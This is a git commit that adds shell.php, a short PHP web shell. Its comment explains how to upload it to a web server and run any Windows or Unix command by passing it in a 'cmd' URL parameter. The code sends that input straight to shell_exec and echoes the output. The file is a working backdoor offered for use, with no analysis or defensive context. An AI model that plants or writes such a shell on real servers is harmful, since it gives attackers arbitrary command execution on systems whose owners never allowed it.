c579a7cd6538c5cf809c982c418cf151a7ea15ff
Sheldon Barry <sheldonbarry@users.noreply.github.com>
2022-06-05 17:14:26 +1000

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,18 @@
+<?php
+
+	/* 
+	To use this file, upload it to a web server.
+
+	execute the script by running url in your browser:
+
+	www.example.com/1.php?cmd=pwd
+
+	www.example.com/1.php?cmd=uname%20-a
+	(if you need to URL encode the command)
+
+	substitute "pwd" for the Windows or *nix command of choice
+	*/
+
+	echo shell_exec($_GET['cmd'].' 2>&1'); 
+
+?>
